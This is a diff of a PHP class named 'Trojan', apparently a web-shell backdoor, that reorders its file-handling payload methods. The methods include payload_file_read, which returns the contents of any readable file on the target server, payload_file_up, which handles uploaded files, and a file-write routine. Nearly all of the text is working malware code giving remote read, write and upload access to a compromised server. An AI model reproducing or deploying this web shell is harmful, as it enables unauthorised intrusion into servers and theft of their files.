@@ -175,7 +175,56 @@ class Trojan{
     /**
      * Edits a file on the server
      */
-    public function payload_file_edit($args){
+    public function payload_file_read($args){
+        # cd to the appropriate directory
+        chdir($this->cwd);
+
+        # verify file exists
+        if(!file_exists($args['file'])){
+            $this->response = array(
+                'error'          => 'The specified file does not exist.',
+                'prompt_context' => $this->prompt_context,
+            );
+            $this->send_response();
+        }
+
+        # verify file is readable
+        if(!is_readable($args['file'])){
+            $this->response = array(
+                'error'          => 'The specified file is not readable.',
+                'prompt_context' => $this->prompt_context,
+            );
+            $this->send_response();
+        }
+
+        # echo back the contents of the file
+        $this->response = array(
+            'output'         => file_get_contents($args['file']),
+            'prompt_context' => $this->prompt_context,
+        );
+        $this->send_response();
+    }
+
+    /**
+     * Uploads files to the target server
+     */
+    public function payload_file_up($args){
+        $out = json_encode($_FILES);
+        $out = json_encode($_FILES);
+
+        # assemble a response
+        $this->response = array(
+            'output'         => $out,
+            'prompt_context' => $this->prompt_context,
+        );
+
+        $this->send_response();
+    }
+
+    /**
+     * Writes a file to the server
+     */
+    public function payload_file_write($args){
         # cd to the appropriate directory
         chdir($this->cwd);
 
@@ -213,55 +262,6 @@ class Trojan{
                 'prompt_context' => $this->prompt_context,
             );
         }
-        $this->send_response();
-    }
-
-    /**
-     * Edits a file on the server
-     */
-    public function payload_file_read($args){
-        # cd to the appropriate directory
-        chdir($this->cwd);
-
-        # verify file exists
-        if(!file_exists($args['file'])){
-            $this->response = array(
-                'error'          => 'The specified file does not exist.',
-                'prompt_context' => $this->prompt_context,
-            );
-            $this->send_response();
-        }
-
-        # verify file is writeable
-        if(!is_readable($args['file'])){
-            $this->response = array(
-                'error'          => 'The specified file is not readable.',
-                'prompt_context' => $this->prompt_context,
-            );
-            $this->send_response();
-        }
-
-        # echo back the contents of the file
-        $this->response = array(
-            'output'         => file_get_contents($args['file']),
-            'prompt_context' => $this->prompt_context,
-        );
-        $this->send_response();
-    }
-
-    /**
-     * Uploads files to the target server
-     */
-    public function payload_file_up($args){
-        $out = json_encode($_FILES);
-        $out = json_encode($_FILES);
-
-        # assemble a response
-        $this->response = array(
-            'output'         => $out,
-            'prompt_context' => $this->prompt_context,
-        );
-
         $this->send_response();
     }
 
